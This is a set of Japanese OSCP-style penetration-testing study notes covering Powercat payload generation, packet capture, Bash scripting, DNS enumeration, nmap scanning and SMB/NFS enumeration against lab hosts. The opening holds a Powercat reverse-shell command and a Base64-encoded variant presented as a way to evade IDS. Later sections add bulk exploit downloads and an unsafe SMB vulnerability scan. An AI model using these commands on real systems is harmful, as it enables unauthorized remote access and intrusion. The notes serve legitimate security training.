<h3 id="%E3%82%B9%E3%82%BF%E3%83%B3%E3%83%89%E3%82%A2%E3%83%AD%E3%83%BC%E3%83%B3%E5%9E%8Bpayload%E3%81%AE%E7%94%9F%E6%88%90">スタンドアローン型payloadの生成</h3>
<p>Powercatでは-gオプションをつけることで、スタンドアローン型ペイロードの生成が可能である。</p>
<pre class="hljs"><code><div>PS C:\Users\offsec&gt; powercat -c 10.11.0.4 -p 443 -e cmd.exe -g &gt; reverseshell.ps1 PS C:\Users\offsec&gt; ./reverseshell.ps1
</div></code></pre>
<p>しかし、スタンドアロン型ペイロードはIDSによって容易に検出される可能性がある。<br>
そこで、Base64でエンコードされたコマンドを実行できるPowerShell機能を利用することで、回避する。<br>
-geオプションを利用することで、</p>
<pre class="hljs"><code><div>PS C:\Users\offsec&gt; powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge &gt; encodedreverseshell.ps1
</div></code></pre>
<p>このファイル内の文字列をコピーして、PowerShellの-Eオプション渡すことで実行できる。</p>
<pre class="hljs"><code><div>PS C:\Users\offsec&gt; powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzA CkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQB yAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAb wBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAo AIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByA HMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIAB OAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAc ABDAGwAaQBlAG4AdAAKACAAIAAgACA
</div></code></pre>
<h2 id="wireshark">Wireshark</h2>
<p>ネットワークプロトコルアナライザー。<br>
ipアドレスやプロトコルでのフィルターを活用して調査を行う。<br>
また、Following TCP Streamsを活用することで、特定のセッションを再構成して表示することができる。FTPのようなクリアテキストのプロトコルの場合、送受信したコマンドや出力を見ることができる。</p>
<h2 id="tcpdump">Tcpdump</h2>
<pre class="hljs"><code><div>kali@kali:~~~$~~ sudo tcpdump -r password_cracking_filtered.pcap
</div></code></pre>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-r</td>
<td>ファイルを開く</td>
</tr>
<tr>
<td>-n</td>
<td>DNS名の検索をスキップ</td>
</tr>
<tr>
<td>src host</td>
<td>送信元ホストの指定</td>
</tr>
<tr>
<td>dst host</td>
<td>宛先ホストの指定</td>
</tr>
<tr>
<td>-X</td>
<td>このオプションを使うことでパケットデータをHEXとASCIIのフォーマットで出力</td>
</tr>
</tbody>
</table>
<h1 id="bash-scripting">Bash Scripting</h1>
<h2 id="%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%81%AE%E5%85%A5%E5%8A%9B">ユーザーの入力</h2>
<pre class="hljs"><code><div>#ユーザーの入力を変数に入れる
read username
#-pはプロンプトを指定
read -p 'Username: ' username
#-sはユーザーの入力を表示しない(パスワードの入力などに最適)
read -sp 'Password: ' password
</div></code></pre>
<h2 id="if%E6%96%87">if文</h2>
<pre class="hljs"><code><div>#!/bin/bash
# if statement example

read -p &quot;What is your age: &quot; age
if [ $age -lt  16 ]
then
    echo &quot;You might need parental permission to take this course!&quot;
fi
</div></code></pre>
<p>[ ]はtestコマンドを呼び出して判定してるだけなので、下記のような表記でも動作する。</p>
<pre class="hljs"><code><div>#!/bin/bash
# if statement example 2
read -p &quot;What is your age: &quot; age
if test $age -lt 16
then
    echo &quot;You might need parental permission to take this course!&quot;
elif test $age -gt 60
then
     echo &quot;hats off to you, respect!&quot;
else
    echo &quot;welcom to course!&quot;
fi
</div></code></pre>
<pre class="hljs"><code><div>#/bin/bash
# and example
#if [ $USER == 'kali' ] &amp;&amp; [ $HOSTNAME == 'kali' ]
#if test $USER == 'kal' || test $HOSTNAME == 'aaa'
then
    echo &quot;Multiple statements are true!&quot;
else
    echo &quot;Not much to see here...&quot;
fi
</div></code></pre>
<h2 id="and-or">AND(&amp;&amp;) OR(||)</h2>
<pre class="hljs"><code><div>#/bin/bash
# and example
if [ $USER == 'kali' ] &amp;&amp; [ $HOSTNAME == 'kali' ]
then
    echo &quot;Multiple statements are true!&quot;
else
    echo &quot;Not much to see here...&quot;
fi
</div></code></pre>
<h2 id="loops">Loops</h2>
<p>seqコマンドは連続の番号や範囲を指定した文字を主力出来る。</p>
<pre class="hljs"><code><div>#1から10までの数を出力
seq 1 10
#5から10までの数を出力
seq 5 10
#5から10までの数を2つずつ増やしながら出力
seq 5 2 10
</div></code></pre>
<pre class="hljs"><code><div>for ip in $(seq 1 10); do echo 10.11.1.$ip; done
</div></code></pre>
<pre class="hljs"><code><div>for ip in $(seq 1 10)
do
    echo 10.11.1.$ip
done
</div></code></pre>
<h3 id="while-loops">while loops</h3>
<pre class="hljs"><code><div>#!/bin/bash
# while loop example
counter=1
while [ $counter -lt 10 ]
do
    echo &quot;10.11.1.$counter&quot;
    ((counter++))
done
</div></code></pre>
<h2 id="%E9%96%A2%E6%95%B0functions">関数(Functions)</h2>
<p>bashにおける()は基本使われることはない。<br>
関数内に$1などが定義されているときに、引数を指定することができる。</p>
<pre class="hljs"><code><div>#!/bin/bash
# passing arguments to functions
pass_arg() {
    echo &quot;Today's random number is: $1&quot;
}
pass_arg $RANDOM
</div></code></pre>
<h2 id="%E5%AE%9F%E8%B7%B5%E7%9A%84%E3%81%AA%E7%B5%84%E3%81%BF%E5%90%88%E3%82%8F%E3%81%9B">実践的な組み合わせ</h2>
<p>afdの文字を含んだwindowsのエクスプロイトを全て検証したいとき、以下のようにbashを使用することでまとめてダウンロードすることができる。</p>
<pre class="hljs"><code><div>┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ searchsploit afd windows -w -t
--------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                             |  URL
--------------------------------------------------------------------------- --------------------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)  | https://www.exploit-db.com/exploits/40564
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                | https://www.exploit-db.com/exploits/18755
Microsoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (M | https://www.exploit-db.com/exploits/21844
Microsoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalatio | https://www.exploit-db.com/exploits/39525
Microsoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalatio | https://www.exploit-db.com/exploits/39446
Microsoft Windows 7 Kernel - Pool-Based Out-of-Bounds Reads Due to bind()  | https://www.exploit-db.com/exploits/42009
Microsoft Windows XP - 'afd.sys' Local Kernel Denial of Service            | https://www.exploit-db.com/exploits/17133
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin | https://www.exploit-db.com/exploits/6757
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080 | https://www.exploit-db.com/exploits/18176
--------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results

┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot; | cut -d &quot;/&quot; -f 5 &gt; list.txt

┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ cat list.txt
40564
18755
21844
39525
39446
42009
17133
6757
18176

┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ for a in $(cat list.txt); do searchsploit -m $a; done
ダウンロード完了！
</div></code></pre>
<h1 id="%E3%83%91%E3%83%83%E3%82%B7%E3%83%96%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%81%93%E3%81%AE%E7%AB%A0%E3%81%AF%E5%85%A8%E4%BD%93%E7%9A%84%E3%81%ABoscp%E8%A9%A6%E9%A8%93%E3%81%AB%E9%96%A2%E4%BF%82%E3%81%AA%E3%81%84%E3%81%9F%E3%82%81%E7%9C%81%E7%95%A5%E3%81%97%E3%81%A6%E3%82%8B%E3%81%A8%E3%81%93%E3%82%8D%E5%A4%9A%E3%81%84">パッシブスキャン(この章は全体的にOSCP試験に関係ないため省略してるところ多い)</h1>
<p>Webサイトを持っている場合、それを訪問して、情報収集を行う。<br>
例）メールアドレスの形式やTwitterのアカウント、その他社員情報</p>
<h2 id="whois%E6%83%85%E5%A0%B1">whois情報</h2>
<pre class="hljs"><code><div>whois MEGACORP.COM
</div></code></pre>
<p>whois情報を確認することで、誰がドメイン名を登録しているのかなどが分かる。<br>
またwhoisコマンドでIPアドレスを使って逆引きすることもできる。逆引きの結果、そのIPアドレスを誰がホストしているのかという情報が得られる。</p>
<h2 id="google-hacking">Google hacking</h2>
<p>以下のような検索を行うことで、どのようなプログラミング言語を用いているのかや、機密情報の公開範囲の設定ミス等を見つけることが可能である。</p>
<pre class="hljs"><code><div>site:MEGACORP.COM filetype:php
</div></code></pre>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>site</td>
<td>ドメイン名の指定</td>
</tr>
<tr>
<td>filetype(ext)</td>
<td>ファイルの拡張子で検索</td>
</tr>
<tr>
<td>intitle</td>
<td>タイトルに含む文字の指定(intitle:&quot;index of&quot; &quot;parent directory&quot;)</td>
</tr>
</tbody>
</table>
<h2 id="%E3%81%9D%E3%81%AE%E4%BB%96">その他</h2>
<p>recon-ngなどのツールの活用
github,gitlab,sourceforgeなどの調査
Shodan
Security Headers
SSL Server Test(Heartbleedなどの脆弱性の特定に利用)
Pastebin
theharvesterによる電子メールの収集</p>
<h1 id="active-information-gathering">Active Information Gathering</h1>
<h2 id="dns">DNS</h2>
<ul>
<li>-NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる</li>
<li>-A(ホストレコード)...ホスト名のIPアドレスが含まれている</li>
<li>-MX(mail Exchangeレコード)...ドメインの電子メール処理を担当するサーバーの名前が含まれている</li>
<li>-PTR(ポインタレコード)...逆引きで使用されIPアドレスに関連するレコードを見つけるために使用される</li>
<li>-TXT(テキストレコード)...テキストレコードは任意のデータを含むことができ、ドメインの所有権確認などを行える</li>
</ul>
<p>hostコマンドはデフォルトではAレコードを検索するが、-tオプションをつけることで、その他のレコードを検索することも可能。</p>
<pre class="hljs"><code><div>kali@kali:~$ host -t txt megacorpone.com
</div></code></pre>
<h3 id="dns%E3%83%96%E3%83%AB%E3%83%BC%E3%83%88%E3%83%95%E3%82%A9%E3%83%BC%E3%82%B9">DNSブルートフォース</h3>
<pre class="hljs"><code><div>┌──(kali㉿kali)-[~]
└─$ cat list.txt                         
www
ftp
mail
owa
proxy
router
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ for domain in $(cat list.txt); do host $domain.megacorpone.com; done
www.megacorpone.com has address 149.56.244.87
Host ftp.megacorpone.com not found: 3(NXDOMAIN)
mail.megacorpone.com has address 51.222.169.212
Host owa.megacorpone.com not found: 3(NXDOMAIN)
Host proxy.megacorpone.com not found: 3(NXDOMAIN)
router.megacorpone.com has address 51.222.169.214
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ for domain in $(cat list.txt); do host $domain.megacorpone.com; done | grep -v &quot;not found&quot;
www.megacorpone.com has address 149.56.244.87
mail.megacorpone.com has address 51.222.169.212
router.megacorpone.com has address 51.222.169.214
</div></code></pre>
<h3 id="dns%E3%82%BE%E3%83%BC%E3%83%B3%E8%BB%A2%E9%80%81">DNSゾーン転送</h3>
<p>権威DNSサーバの設定不備によってゾーン情報を取得できることがある。<br>
これによりサーバーの名前、アドレス、機能などを調べることができる。</p>
<pre class="hljs"><code><div>host -l &lt;domain name&gt; &lt;dns server address&gt;
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:~$ host -l megacorpone.com ns2.megacorpone.com
Using domain server:
Name: ns2.megacorpone.com
Address: 38.100.193.80#53
Aliases:
megacorpone.com name server ns1.megacorpone.com.
megacorpone.com name server ns2.megacorpone.com.
megacorpone.com name server ns3.megacorpone.com.
admin.megacorpone.com has address 38.100.193.83
beta.megacorpone.com has address 38.100.193.88
fs1.megacorpone.com has address 38.100.193.82
intranet.megacorpone.com has address 38.100.193.87
mail.megacorpone.com has address 38.100.193.84
mail2.megacorpone.com has address 38.100.193.73
ns1.megacorpone.com has address 38.100.193.70
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:~$ host -t ns megacorpone.com | cut -d &quot; &quot; -f 4
ns1.megacorpone.com.
ns2.megacorpone.com.
ns3.megacorpone.com.
</div></code></pre>
<p>関連するネームサーバーを特定し、それからゾーン転送を試みるプロセスを自動化するBashスクリプト。</p>
<pre class="hljs"><code><div>#!/bin/bash
# Simple Zone Transfer Bash Script
# $1 is the first argument given after the bash script
# Check if argument was given, if not, print usage
if [ -z &quot;$1&quot; ]; then
    echo &quot;[*] Simple Zone transfer script&quot;
    echo &quot;[*] Usage : $0 &lt;domain name&gt; &quot;
    exit 0
fi
# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 | cut -d &quot; &quot; -f4); do
    # For each of these servers, attempt a zone transfer
    host -l $1 $server |grep &quot;has address&quot;
done
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:~$ chmod +x dns-axfr.sh
kali@kali:~$ ./dns-axfr.sh megacorpone.com
admin.megacorpone.com has address 38.100.193.83
beta.megacorpone.com has address 38.100.193.88
fs1.megacorpone.com has address 38.100.193.82
intranet.megacorpone.com has address 38.100.193.87
mail.megacorpone.com has address 38.100.193.84
mail2.megacorpone.com has address 38.100.193.73
ns1.megacorpone.com has address 38.100.193.70
ns2.megacorpone.com has address 38.100.193.80
ns3.megacorpone.com has address 38.100.193.90
</div></code></pre>
<h3 id="dnsrecon">DNSRecon</h3>
<p>DNS列挙スクリプト。</p>
<pre class="hljs"><code><div>1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
</div></code></pre>
<ul>
<li>-d...ドメイン名の指定</li>
<li>-t...実行する列挙の種類(1つ目はゾーン転送)</li>
<li>-t...実行する列挙の種類(2つ目はブルートフォース)</li>
<li>-D...サブドメイン文字列を含むファイルの指定</li>
</ul>
<h3 id="dnsenum">DNSenum</h3>
<p>DNSReconとは異なった出力をするDNS列挙ツール。</p>
<pre class="hljs"><code><div>kali@kali:~$ dnsenum zonetransfer.me
</div></code></pre>
<h2 id="port-scanning">Port Scanning</h2>
<p>ポートスキャンとは、リモートマシン上のTCPまたはUDPポートを検査するプロセス。</p>
<h3 id="tcpudp%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">TCP/UDPスキャン</h3>
<p>TCPスキャンでは3ウェイハンドシェイクによってポートが開いているかを確認する。<br>
UDPスキャンでは、空のパケットを送信し、送信先のUDPポートが開いている場合、パケットがアプリケーション層に渡され、受信するレスポンスはアプリケーションによって異なる。UDPポートが閉じられている場合は「ICMP port unreachable」メッセージを使用して空いてるかを調べる。<br>
しかしこれにはいくつかの問題があり、UDPスキャンを使用する場合、ファイアウォールやルーターによってICMPパケットをドロップすることがあるため、誤判定を生んでしまう。</p>
<h3 id="nmap">nmap</h3>
<h4 id="%E3%82%B9%E3%83%86%E3%83%AB%E3%82%B9syn%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">ステルス/SYNスキャン</h4>
<p>ユーザーがraw sockets権限を持っている場合に使用されるNmapのデフォルトスキャン。よって、sudo/root権限の場合のデフォルトスキャンを意味する。<br>
オプションは-sS。<br>
SYNスキャンはTCPハンドシェイクを完了せずに、ターゲットマシンの様々なポートにSYNパケットを送信するTCPポートスキャン手法。3ウェイハンドシェイクを完了するための最後のACKを送信しない。</p>
<pre class="hljs"><code><div>kali@kali:~$ sudo nmap -sS 10.11.1.220
</div></code></pre>
<h4 id="tcp%E3%82%B3%E3%83%8D%E3%82%AF%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">TCPコネクトスキャン</h4>
<p>ユーザーがraw socket権限を持っていない場合、nmapはデフォルトでこのスキャンを使用する。バークレーのソケットAPIを利用して3ウェイハンドシェイクを実行する。3ウェイハンドシェイクを完了させるため、SYSスキャンよりも完了までの時間は長くなる。<br>
オプションは-sT。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -sT 10.11.1.220
</div></code></pre>
<h4 id="udp%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">UDPスキャン</h4>
<p>UDPスキャンを実行する場合、Nmapは2つの異なる方法を組み合わせて、ポートが開いているか閉じているかを判断する。一つは先ほどまでに登場していた空のパケットを送信して確かめる「ICMP port unreachable」。もう一つはSNMPなどに対してはプロトコル固有のSNMPパケットを送信して応答を得る。<br>
オプションは-sU。</p>
<pre class="hljs"><code><div>kali@kali:~$ sudo nmap -sU 10.11.1.115
</div></code></pre>
<p>UDPスキャンはTCP SYNスキャンと組み合わせて使用することも可能で、ターゲットを完全に把握することができる。</p>
<pre class="hljs"><code><div>kali@kali:~$ sudo nmap -sS -sU 10.11.1.115
</div></code></pre>
<h4 id="network-sweeping">Network Sweeping</h4>
<p>ネットワークスイープを行い、ホストのスキャンを行う。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -sn 10.11.1.1-254
</div></code></pre>
<p>オプション-oGを使用することでgrepができるファイルを出力することができる。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
kali@kali:~$ grep Up ping-sweep.txt | cut -d &quot; &quot; -f 2
10.11.1.5
10.11.1.7
10.11.1.8
...
</div></code></pre>
<p>複数のIPをスキャンして、共通のポートを列挙するためには--top-portsオプションを使用することで上位20個のTCPポートを列挙することができる。また、-AでOSバージョン検出。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
</div></code></pre>
<h4 id="os-%E3%83%95%E3%82%A3%E3%83%B3%E3%82%AC%E3%83%BC%E3%83%97%E3%83%AA%E3%83%B3%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0">OS フィンガープリンティング</h4>
<p>オペレーティングシステムはTCP/IPスタックの実装がわずかに異なる。(デフォルトのTTL値やTCPウィンドウサイズが異なるなど)<br>
ここからnmapはOSの識別を行う。</p>
<pre class="hljs"><code><div>kali@kali:~$ sudo nmap -O 10.11.1.220
Device type: general purpose
Running: Microsoft Windows 2008|7
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
OS details: Microsoft Windows 7 or Windows Server 2008 R2
Network Distance: 1 hop
</div></code></pre>
<h4 id="%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E5%88%97%E6%8C%99">サービス列挙</h4>
<p>オプション-sVを使用することで特定のポートで動作しているサービスを識別することができる。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -sV -sT -A 10.11.1.220
</div></code></pre>
<h4 id="nmap-scripting-enginense">Nmap Scripting Engine(NSE)</h4>
<p>ユーザが作成したスクリプトを起動し、さまざまなスキャン作業を自動化することができる。
例)DNSの列挙、ブルートフォース攻撃、脆弱性の特定など<br>
NSEスクリプトは/usr/share/nmap/scriptsディレクトリに配置されている</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap 10.11.1.220 --script=smb-os-discovery
...
OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Sta
| OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
| Computer name: master
| NetBIOS computer name: MASTER\x00
| Domain name: thinc.local
| Forest name: thinc.local
| FQDN: master.thinc.local
|_ System time: 2013-12-27T23:37:58-08:00
Nmap done: 1 IP address (1 host up) scanned in 5.85 seconds
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:~$ nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 11:54 EST
Nmap scan report for ns2.megacorpone.com (38.100.193.80)
Host is up (0.010s latency).
Other addresses for ns2.megacorpone.com (not scanned):
PORT STATE SERVICE
53/tcp open domain
| dns-zone-transfer:
| megacorpone.com. SOA ns1.megacorpone.com. admin.megacorpone.com.
| megacorpone.com. MX 10 fb.mail.gandi.net.
| megacorpone.com. MX 20 spool.mail.gandi.net.
| megacorpone.com. MX 50 mail.megacorpone.com.
| megacorpone.com. MX 60 mail2.megacorpone.com.
| megacorpone.com. NS ns1.megacorpone.com.
...
</div></code></pre>
<h4 id="nmap%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3">Nmapオプション:</h4>
<ul>
<li>-sS...ステルス/SYNスキャン</li>
<li>-sT...TCPコネクトスキャン</li>
<li>-sU...UDPスキャン</li>
<li>-sn...ネットワークスイープ</li>
<li>-A...OSのバージョン検出</li>
<li>-sC...--script=defaultの意味</li>
<li>-sV...特定のポートで動作しているサービスを識別</li>
<li>--script=...様々なスクリプトの使用
<ul>
<li>dns-zone-transfer</li>
<li>smb-os-discovery</li>
<li>http-enum</li>
<li>vuln</li>
</ul>
</li>
<li>-O...OSフィンガープリンティング(ターゲットのOS判別)</li>
<li>-v...詳細の出力</li>
<li>-oG...grep可能なファイル形式に出力</li>
<li>--top-ports...優先度の高い順にポートを検出(/usr/share/nmap/nmap-servicesに依存)</li>
</ul>
<h3 id="masscan">Masscan</h3>
<p>Massscanはインターネット全体を約6分でスキャンし、1秒間に1000万パケットという驚異的な数のパケットを送信する最速のポートスキャナー。<br>
raw socketsの権限を必要とするためsudoを用いる。　　
下記のコマンドではTCPポート80が空いているホストをclass Aサブネットで列挙している。</p>
<pre class="hljs"><code><div>kali@kali:~$ sudo masscan -p80 10.0.0.0/8
</div></code></pre>
<h2 id="smb">SMB</h2>
<h3 id="netbios%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3">NetBIOSのスキャン</h3>
<p>NetBIOSはローカルネットワーク上のコンピュータが相互に通信できるようにするセッション層のプロトコルである。<br>
最近のSMBの実装ではNetBIOSがなくても動作するが、NetBIOS over TCP(NBT)は後方互換性のために必要で、ともに有効になっている場合が多い。このt前、2つのサービスの列挙は一緒に行われる。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -v -p 139,445 -oG result.txt 10.10.10.1
</div></code></pre>
<h4 id="nbtscan">nbtscan</h4>
<p>NetBIOS情報を特定するための専門的ツール。オプション-rを使用することで発信元のUDPポートを137に指定している。</p>
<pre class="hljs"><code><div>kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
</div></code></pre>
<h3 id="nmap-nse-scripts%E3%81%AB%E3%82%88%E3%82%8Bsmb%E3%81%AE%E5%88%97%E6%8C%99">Nmap NSE ScriptsによるSMBの列挙</h3>
<p>Nmap NES Scriptsのディレクトリ(SMB):</p>
<pre class="hljs"><code><div>/usr/share/nmap/scripts
</div></code></pre>
<p>SMBによるOSの検出や列挙(smb-os-discovery):</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
</div></code></pre>
<p>SMBプロトコルの既知の脆弱性をチェックする場合:<br>
(unsafe=1にした場合、脆弱なシステムをクラッシュさせてしまう可能性があるので、本番システムをスキャンする場合は注意)</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.1
</div></code></pre>
<h2 id="nfs">NFS</h2>
<p>Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。<br>
NFSはUNIX系OSで使用されることが多く、その実装は安全ではない。<br>
NFSで使用されるPortmapperとRPCbindはともにTCPポート111で動作する。</p>
<pre class="hljs"><code><div>kali@kali:~$ nmap -v -p 111 10.10.10.1
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.10.10.1
</div></code></pre>
<p>NFSが動作していることが分かった場合/usr/share/nmap/scriptsにあるNSEスクリプトを使用して、サービスの列挙や追加サービスの発見を行うことができる。「*」を使用することで、まとめて使用することができる。</p>
<pre class="hljs"><code><div>kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
/usr/share/nmap/scripts/nfs-ls.nse
/usr/share/nmap/scripts/nfs-showmount.nse
/usr/share/nmap/scripts/nfs-statfs.nse

kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
</div></code></pre>
<h3 id="nfs%E3%81%AE%E3%83%9E%E3%82%A6%E3%83%B3%E3%83%88">NFSのマウント</h3>
<p>mountコマンドを使用することでファイルのアクセスできるようになる。<br>
オプション-o nolockでファイルロックを無効にする。</p>
<pre class="hljs"><code><div>kali@kali:~$ mkdir test
kali@kali:~$ sudo mount -o nolock 10.11.1.72:/home ~/test/
kali@kali:~$ cd test/ &amp;&amp; ls
jenny joe45 john marcus ryuu
</div></code></pre>
<h2 id="smtp">SMTP</h2>
<p>次回p190 OS Fingerprintingから学習開始</p>

</body>
</html>
